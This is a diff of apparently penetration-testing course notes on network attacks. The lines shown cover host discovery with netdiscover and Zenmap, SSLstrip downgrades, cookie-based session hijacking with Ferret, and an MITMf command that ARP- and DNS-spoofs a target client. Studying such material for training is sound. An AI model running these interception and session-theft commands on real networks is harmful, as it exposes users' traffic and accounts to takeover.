@@ -84,7 +84,7 @@ Here are the commands that will be used in the course
 ## Information Gathering
 After authenticating to a network you gather information about it.
 ### Using Netdiscover
-* `netdiscover -i wlan0 -r <network internal IP>.1/24`
+* `netdiscover -r <network internal IP>.1/24 -i wlan0`
 ### Using Autoscan
 * download [Autoscan](http://autoscan-network.com/download)
 * add 32bit compatibility `dpkg --add-architecture i386`
@@ -92,7 +92,7 @@ After authenticating to a network you gather information about it.
 * download and install library `apt-get install libc6:i386`
 * install Autoscan in the terminal running `./<downaloaded file>`
 * run Autoscan
-### Using Nmap
+### Using Nmap (Zenmap)
 * run `zenmap`
 * in Target put `<network internal IP>.1/24`
 * play arround with Profile
@@ -112,6 +112,7 @@ These atacks only work with HTTP sites without HSTS
 This way you can see all the post request made by the target client.
 
 To bypass HTTPS request use SSLstrip to downgrade HTTPS to an HTTP request.
+
 ### Session Hijacking
 If the user clicks on the "remember me" button a cookie is made in the browser. So we sniff the cookies and inject them to our browser.
 * Install Ferret
@@ -126,7 +127,7 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
   * `service apache2 start`
   * The content of the page is in `/var/www/html`
 * Edit DNS settings
-  * `leafpad /etc/mitmf/mitmf.conf`
+  * `nano /etc/mitmf/mitmf.conf`
   * Edit the `A` record, that is responsible for translate names to IP adresses
 * Become the MITM
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --dns`
